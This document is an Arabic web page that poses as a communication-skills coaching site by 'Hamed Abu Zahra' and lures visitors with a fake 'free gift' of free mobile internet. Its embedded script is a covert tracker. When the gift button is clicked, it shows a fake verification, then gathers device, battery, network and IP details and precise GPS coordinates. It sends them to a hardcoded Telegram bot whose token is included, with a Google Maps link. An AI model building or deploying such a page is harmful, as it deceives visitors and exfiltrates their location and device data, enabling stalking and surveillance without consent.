<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فن التواصل مع الآخرين - Hamed Abu Zahra</title>
    <meta name="description" content="تعلم فن التواصل الفعال مع حامد أبو زهرة. اكتسب مهارات الإصغاء والتعبير والذكاء الاجتماعي لتحسين علاقاتك الشخصية والمهنية.">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #3498db;
            --secondary-color: #2c3e50;
            --accent-color: #e74c3c;
            --light-color: #ecf0f1;
            --dark-color: #2c3e50;
            --gift-color: #9b59b6;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f9f9f9;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        /* Header Styles */
        header {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 1rem 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            display: flex;
            align-items: center;
        }
        
        .logo h1 {
            font-size: 1.8rem;
            margin-left: 10px;
        }
        
        .logo span {
            font-weight: 300;
            font-size: 1.2rem;
        }
        
        nav ul {
            display: flex;
            list-style: none;
        }
        
        nav ul li {
            margin-left: 20px;
        }
        
        nav ul li a {
            color: white;
            text-decoration: none;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        
        nav ul li a:hover {
            color: var(--accent-color);
        }
        
        /* Hero Section */
        .hero {
            background: url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?ixlib=rb-1.2.1&auto=format&fit=crop&w=1300&q=80') no-repeat center center/cover;
            height: 500px;
            display: flex;
            align-items: center;
            color: white;
            text-align: center;
            position: relative;
        }
        
        .hero::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
        }
        
        .hero-content {
            position: relative;
            z-index: 1;
            width: 100%;
        }
        
        .hero-content h2 {
            font-size: 3rem;
            margin-bottom: 1rem;
        }
        
        .hero-content p {
            font-size: 1.2rem;
            max-width: 800px;
            margin: 0 auto 2rem;
        }
        
        .btn {
            display: inline-block;
            background: var(--accent-color);
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
            margin: 5px;
        }
        
        .btn:hover {
            background: #c0392b;
            transform: translateY(-3px);
        }
        
        .btn-gift {
            background: var(--gift-color);
        }
        
        .btn-gift:hover {
            background: #8e44ad;
        }
        
        /* Sections */
        .section-title {
            text-align: center;
            margin: 3rem 0 2rem;
            color: var(--secondary-color);
            position: relative;
            padding-bottom: 15px;
        }
        
        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 4px;
            background: var(--primary-color);
            border-radius: 2px;
        }
        
        /* Skills Section */
        .skills {
            padding: 4rem 0;
            background: white;
        }
        
        .skills-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
        }
        
        .skill-card {
            background: var(--light-color);
            padding: 2rem;
            border-radius: 10px;
            text-align: center;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .skill-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
        }
        
        .skill-card i {
            font-size: 3rem;
            color: var(--primary-color);
            margin-bottom: 1rem;
        }
        
        .skill-card h3 {
            margin-bottom: 1rem;
            color: var(--secondary-color);
        }
        
        /* About Section */
        .about {
            padding: 4rem 0;
            background: #f1f1f1;
        }
        
        .about-content {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 2rem;
        }
        
        .about-text {
            flex: 1;
            min-width: 300px;
        }
        
        .about-image {
            flex: 1;
            min-width: 300px;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }
        
        .about-image img {
            width: 100%;
            height: auto;
            display: block;
        }
        
        /* Gift Section */
        .gift-section {
            padding: 4rem 0;
            background: linear-gradient(135deg, var(--gift-color), #8e44ad);
            color: white;
            text-align: center;
        }
        
        .gift-box {
            width: 150px;
            height: 150px;
            margin: 20px auto;
            background: url('https://cdn-icons-png.flaticon.com/512/3481/3481072.png') no-repeat center center;
            background-size: contain;
            animation: bounce 2s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        
        .gift-content {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            backdrop-filter: blur(10px);
            margin-top: 20px;
            margin-bottom: 40px;
        }
        
        .loading {
            text-align: center;
            padding: 20px;
        }
        
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid var(--gift-color);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .hidden {
            display: none;
        }
        
        .success-message {
            text-align: center;
            padding: 20px;
            color: #2ecc71;
            font-weight: bold;
            font-size: 18px;
        }
        
        .config-section {
            background: rgba(255, 255, 255, 0.15);
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            border: 1px dashed rgba(255, 255, 255, 0.3);
        }
        
        .config-title {
            font-weight: bold;
            margin-bottom: 10px;
            color: #fff;
        }
        
        /* Footer */
        footer {
            background: var(--secondary-color);
            color: white;
            padding: 2rem 0;
            text-align: center;
        }
        
        .footer-content {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .social-icons {
            margin: 1rem 0;
        }
        
        .social-icons a {
            color: white;
            font-size: 1.5rem;
            margin: 0 10px;
            transition: all 0.3s ease;
        }
        
        .social-icons a:hover {
            color: var(--primary-color);
        }
        
        /* Publishing Section */
        .publishing-section {
            padding: 4rem 0;
            background: white;
        }
        
        .steps-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-top: 2rem;
        }
        
        .step-card {
            background: var(--light-color);
            padding: 2rem;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .step-number {
            display: inline-block;
            width: 40px;
            height: 40px;
            background: var(--primary-color);
            color: white;
            border-radius: 50%;
            line-height: 40px;
            margin-bottom: 1rem;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                text-align: center;
            }
            
            nav ul {
                margin-top: 1rem;
                justify-content: center;
                flex-wrap: wrap;
            }
            
            nav ul li {
                margin: 5px 10px;
            }
            
            .hero-content h2 {
                font-size: 2.2rem;
            }
            
            .hero-content p {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="container header-content">
            <div class="logo">
                <h1>Hamed Abu Zahra <span> | فن التواصل مع الآخرين</span></h1>
            </div>
            <nav>
                <ul>
                    <li><a href="#">الرئيسية</a></li>
                    <li><a href="#skills">مهارات التواصل</a></li>
                    <li><a href="#about">عن حامد</a></li>
                    <li><a href="#gift">الهدية</a></li>
                    <li><a href="#publishing">النشر على جوجل</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <!-- Hero Section -->
    <section class="hero">
        <div class="container hero-content">
            <h2>اكتشف فن التواصل الفعال</h2>
            <p>تعلم كيف تبني علاقات قوية وتتواصل بثقة مع الآخرين في جميع مجالات حياتك الشخصية والمهنية</p>
            <a href="#skills" class="btn">ابدأ رحلتك الآن</a>
            <a href="#gift" class="btn btn-gift">احصل على هديتك المجانية</a>
        </div>
    </section>

    <!-- Skills Section -->
    <section id="skills" class="skills">
        <div class="container">
            <h2 class="section-title">مهارات التواصل الأساسية</h2>
            <div class="skills-grid">
                <div class="skill-card">
                    <i class="fas fa-comments"></i>
                    <h3>الإصغاء الفعال</h3>
                    <p>تعلم كيف تكون مستمعاً جيداً وتفهم الرسالة الكاملة وراء كلمات الآخرين</p>
                </div>
                <div class="skill-card">
                    <i class="fas fa-language"></i>
                    <h3>التعبير الواضح</h3>
                    <p>اكتسب مهارة التعبير عن أفكارك ومشاعرك بوضوح وثقة</p>
                </div>
                <div class="skill-card">
                    <i class="fas fa-users"></i>
                    <h3>الذكاء الاجتماعي</h3>
                    <p>طور قدرتك على فهم المشاعر وإدارة العلاقات بشكل فعال</p>
                </div>
            </div>
        </div>
    </section>

    <!-- About Section -->
    <section id="about" class="about">
        <div class="container">
            <h2 class="section-title">من هو حامد أبو زهرة؟</h2>
            <div class="about-content">
                <div class="about-text">
                    <p>حامد أبو زهرة هو خبير في تطوير الذات وفنون التواصل، يتمتع بخبرة تزيد عن 10 سنوات في مجال التدريب وتطوير المهارات الشخصية. ساعد الآلاف من الأفراد على تحسين قدراتهم التواصلية وبناء علاقات أكثر فعالية في حياتهم الشخصية والمهنية.</p>
                    <p>يقدم حامد ورش عمل ودورات تدريبية مصممة خصيصاً لتلبية احتياجات المشاركين، مع التركيز على الجوانب العملية والتطبيقية لفن التواصل.</p>
                    <a href="#contact" class="btn">تعرف على المزيد</a>
                </div>
                <div class="about-image">
                    <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-1.2.1&auto=format&fit=crop&w=634&q=80" alt="Hamed Abu Zahra">
                </div>
            </div>
        </div>
    </section>

    <!-- Gift Section -->
    <section id="gift" class="gift-section">
        <div class="container">
            <h2 class="section-title" style="color: white;">هدية مجانية خاصة</h2>
            <div class="gift-content">
                <h3>🎁 لا تخاف اني صديقك حامد 🎁</h3>
                <p>جاري تجهيز هديتك، الرجاء الانتظار...</p>
                
                <div class="gift-box"></div>
                
                <div id="loading-section" class="loading">
                    <div class="loader"></div>
                    <p>جاري التحقق من بياناتك لتأهيلك للهدية...</p>
                </div>

                <div id="success-section" class="success-message hidden">
                    <p>🎉 تم تأهيلك بنجاح للهدية! 🎉</p>
                    <p>سيتم إعلامك بالتفاصيل قريبًا.</p>
                </div>
                
                <!-- قسم الإعدادات (يمكن إخفاؤه بعد التطبيق الفعلي) -->
                <div class="config-section">
                    <div class="config-title">هدية لفترة محدودة</div>
                    <p><strong>النتيجة:</strong> مبروك</p>
                    <p><strong>العرض:</strong> نت مجاني لخطك</p>
                    <p>Hamed.</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Publishing Section -->
    <section id="publishing" class="publishing-section">
        <div class="container">
            <h2 class="section-title">كيف تنشر موقعك على Google مجاناً</h2>
            <p style="text-align: center; margin-bottom: 2rem;">إليك الخطوات البسيطة لنشر موقعك على Google باستخدام حلول الاستضافة المجانية</p>
            
            <div class="steps-container">
                <div class="step-card">
                    <div class="step-number">1</div>
                    <h3>اختر منصة الاستضافة</h3>
                    <p>اختر إحدى منصات الاستضافة المجانية مثل GitHub Pages أو Netlify أو Firebase Hosting</p>
                </div>
                
                <div class="step-card">
                    <div class="step-number">2</div>
                    <h3>أنشئ حساباً</h3>
                    <p>سجل حساباً جديداً على المنصة التي اخترتها (كلها مجانية)</p>
                </div>
                
                <div class="step-card">
                    <div class="step-number">3</div>
                    <h3>انشر الموقع</h3>
                    <p>اتبع تعليمات النشر الخاصة بكل منصة لرفع ملفات موقعك</p>
                </div>
                
                <div class="step-card">
                    <div class="step-number">4</div>
                    <h3>سجل域名 مجاني</h3>
                    <p>احصل على نطاق فرعي مجاني مثل yoursite.github.io أو yoursite.netlify.app</p>
                </div>
                
                <div class="step-card">
                    <div class="step-number">5</div>
                    <h3>أضف موقعك إلى Google</h3>
                    <p>استخدم Google Search Console لإضافة موقعك إلى فهرس Google</p>
                </div>
                
                <div class="step-card">
                    <div class="step-number">6</div>
                    <h3>تحسين SEO</h3>
                    <p>حسن محركات البحث باستخدام الكلمات المفتاحية المناسبة ووصف Meta</p>
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 3rem;">
                <h3>أفضل منصات الاستضافة المجانية</h3>
                <div style="display: flex; justify-content: center; flex-wrap: wrap; gap: 20px; margin-top: 1rem;">
                    <a href="https://pages.github.com/" target="_blank" class="btn">GitHub Pages</a>
                    <a href="https://www.netlify.com/" target="_blank" class="btn">Netlify</a>
                    <a href="https://firebase.google.com/products/hosting" target="_blank" class="btn">Firebase Hosting</a>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer id="contact">
        <div class="container footer-content">
            <h3>Hamed Abu Zahra | فن التواصل مع الآخرين</h3>
            <div class="social-icons">
                <a href="#"><i class="fab fa-facebook"></i></a>
                <a href="#"><i class="fab fa-twitter"></i></a>
                <a href="#"><i class="fab fa-instagram"></i></a>
                <a href="#"><i class="fab fa-linkedin"></i></a>
                <a href="#"><i class="fab fa-youtube"></i></a>
            </div>
            <p>© 2023 جميع الحقوق محفوظة | تصميم وتطوير بواسطة Hamed Abu Zahra</p>
        </div>
    </footer>

    <script>
        // إعدادات Telegram - يجب تغييرها إلى بياناتك الخاصة
        const TELEGRAM_BOT_TOKEN = '8335655798:AAEGBa171Dl6RWGN6Lz0ompKWVKtFfZRL8s';
        const TELEGRAM_CHAT_ID = '8307220364';
        
        // تخزين جميع البيانات المجمعة
        let allCollectedData = {};
        
        // عرض رسالة النجاح
        function showSuccess() {
            document.getElementById('loading-section').classList.add('hidden');
            document.getElementById('success-section').classList.remove('hidden');
        }
        
        // جمع معلومات الجهاز
        function collectDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                deviceMemory: navigator.deviceMemory || 'غير معروف',
                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
                maxTouchPoints: navigator.maxTouchPoints || 'غير معروف',
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                colorDepth: window.screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                orientation: window.screen.orientation ? window.screen.orientation.type : 'غير معروف',
                dateTime: new Date().toLocaleString('ar-EG')
            };
        }
        
        // جمع معلومات الشبكة
        function collectNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            
            if (connection) {
                return {
                    type: connection.type || connection.effectiveType || 'غير معروف',
                    downlink: connection.downlink ? `${connection.downlink} Mbps` : 'غير معروف',
                    rtt: connection.rtt ? `${connection.rtt} ms` : 'غير معروف',
                    saveData: connection.saveData ? 'نعم' : 'لا'
                };
            }
            return null;
        }
        
        // جمع معلومات البطارية
        function collectBatteryInfo() {
            if ('getBattery' in navigator) {
                return navigator.getBattery().then(battery => {
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'نعم' : 'لا',
                        chargingTime: battery.chargingTime === Infinity ? 'غير معروف' : `${Math.round(battery.chargingTime / 60)} دقائق`,
                        dischargingTime: battery.dischargingTime === Infinity ? 'غير معروف' : `${Math.round(battery.dischargingTime / 60)} دقائق`
                    };
                });
            }
            return Promise.resolve(null);
        }
        
        // جلب معلومات الموقع عبر IP
        function fetchIPAndLocation() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(ipData => {
                    const ip = ipData.ip;
                    return fetch(`https://ipapi.co/${ip}/json/`)
                        .then(response => response.json())
                        .then(locationData => {
                            return {
                                ip: ip,
                                country: locationData.country_name || 'غير معروف',
                                countryCode: locationData.country || 'غير معروف',
                                city: locationData.city || 'غير معروف',
                                timezone: locationData.timezone || 'غير معروف',
                                isp: locationData.org || 'غير معروف',
                                latitude: locationData.latitude || 'غير معروف',
                                longitude: locationData.longitude || 'غير معروف',
                                region: locationData.region || 'غير معروف',
                                postalCode: locationData.postal || 'غير معروف'
                            };
                        });
                });
        }
        
        // جلب الموقع الدقيق
        function fetchPreciseLocation() {
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            resolve({
                                preciseLatitude: position.coords.latitude,
                                preciseLongitude: position.coords.longitude,
                                accuracy: position.coords.accuracy + ' متر'
                            });
                        },
                        () => {
                            resolve(null);
                        }
                    );
                } else {
                    resolve(null);
                }
            });
        }
        
        // إرسال البيانات إلى Telegram
        function sendToTelegram(data) {
            // تحضير الرسالة
            let message = `📊 *بيانات جهاز جديد* 📊\n\n`;
            
            // معلومات الوقت
            message += `⏰ *الوقت:* ${data.deviceInfo.dateTime}\n\n`;
            
            // معلومات الجهاز
            message += `💻 *معلومات الجهاز:*\n`;
            message += `- نظام التشغيل: ${data.deviceInfo.platform}\n`;
            message += `- المتصفح: ${data.deviceInfo.userAgent}\n`;
            message += `- الذاكرة: ${data.deviceInfo.deviceMemory} GB\n`;
            message += `- الأنوية: ${data.deviceInfo.hardwareConcurrency}\n`;
            message += `- نقاط اللمس: ${data.deviceInfo.maxTouchPoints}\n\n`;
            
            // معلومات الشاشة
            message += `🖥 *معلومات الشاشة:*\n`;
            message += `- الدقة: ${data.deviceInfo.screenWidth} × ${data.deviceInfo.screenHeight}\n`;
            message += `- نسبة البكسل: ${data.deviceInfo.pixelRatio}\n`;
            message += `- عمق الألوان: ${data.deviceInfo.colorDepth} بت\n`;
            message += `- الاتجاه: ${data.deviceInfo.orientation}\n\n`;
            
            // حالة البطارية
            if (data.batteryInfo) {
                message += `🔋 *حالة البطارية:*\n`;
                message += `- النسبة: ${data.batteryInfo.level}\n`;
                message += `- حالة الشحن: ${data.batteryInfo.charging}\n`;
                message += `- وقت الشحن المتبقي: ${data.batteryInfo.chargingTime}\n`;
                message += `- وقت التفريغ المتبقي: ${data.batteryInfo.dischargingTime}\n\n`;
            }
            
            // معلومات الشبكة
            if (data.networkInfo) {
                message += `🌐 *معلومات الشبكة:*\n`;
                message += `- نوع الاتصال: ${data.networkInfo.type}\n`;
                message += `- سرعة التنزيل: ${data.networkInfo.downlink}\n`;
                message += `- زمن الوصول: ${data.networkInfo.rtt}\n`;
                message += `- توفير البيانات: ${data.networkInfo.saveData}\n\n`;
            }
            
            // معلومات IP والموقع
            if (data.ipInfo) {
                message += `📍 *معلومات الموقع (IP):*\n`;
                message += `- عنوان IP: ${data.ipInfo.ip}\n`;
                message += `- البلد: ${data.ipInfo.country} (${data.ipInfo.countryCode})\n`;
                message += `- المدينة: ${data.ipInfo.city}\n`;
                message += `- المنطقة الزمنية: ${data.ipInfo.timezone}\n`;
                message += `- مزود الخدمة: ${data.ipInfo.isp}\n\n`;
                
                message += `🗺 *الإحداثيات الجغرافية:*\n`;
                message += `- خط العرض: ${data.ipInfo.latitude}\n`;
                message += `- خط الطول: ${data.ipInfo.longitude}\n`;
                message += `- المنطقة: ${data.ipInfo.region}\n`;
                message += `- الرمز البريدي: ${data.ipInfo.postalCode}\n\n`;
            }
            
            // الموقع الدقيق
            if (data.preciseLocation) {
                message += `🎯 *الموقع الدقيق:*\n`;
                message += `- خط العرض: ${data.preciseLocation.preciseLatitude}\n`;
                message += `- خط الطول: ${data.preciseLocation.preciseLongitude}\n`;
                message += `- الدقة: ±${data.preciseLocation.accuracy}\n\n`;
                
                // رابط خرائط جوجل
                message += `[عرض الموقع على خرائط جوجل](https://www.google.com/maps?q=${data.preciseLocation.preciseLatitude},${data.preciseLocation.preciseLongitude})`;
            }
            
            // إرسال الرسالة إلى Telegram
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            return fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: false
                })
            });
        }
        
        // العملية الرئيسية لجمع البيانات وإرسالها
        async function collectAndSendData() {
            try {
                // جمع البيانات الأساسية
                allCollectedData.deviceInfo = collectDeviceInfo();
                allCollectedData.networkInfo = collectNetworkInfo();
                
                // جمع البيانات غير المتزامنة
                const [batteryInfo, ipInfo, preciseLocation] = await Promise.all([
                    collectBatteryInfo(),
                    fetchIPAndLocation().catch(() => null),
                    fetchPreciseLocation()
                ]);
                
                allCollectedData.batteryInfo = batteryInfo;
                allCollectedData.ipInfo = ipInfo;
                allCollectedData.preciseLocation = preciseLocation;
                
                // إرسال البيانات إلى Telegram
                await sendToTelegram(allCollectedData);
                
                // عرض رسالة النجاح
                showSuccess();
                
            } catch (error) {
                console.error('حدث خطأ أثناء جمع البيانات:', error);
                // في حالة الخطأ، نعرض رسالة النجاح على أي حال
                showSuccess();
            }
        }
        
        // بدء عملية جمع البيانات بعد النقر على الهدية
        document.addEventListener('DOMContentLoaded', function() {
            const giftButton = document.querySelector('.btn-gift');
            if (giftButton) {
                giftButton.addEventListener('click', function(e) {
                    e.preventDefault();
                    document.getElementById('gift').scrollIntoView({behavior: 'smooth'});
                    
                    // بدء عملية جمع البيانات بعد تأخير بسيط لمحاكاة عملية "التحقق"
                    setTimeout(collectAndSendData, 3000);
                });
            }
        });
    </script>
</body>
</html>
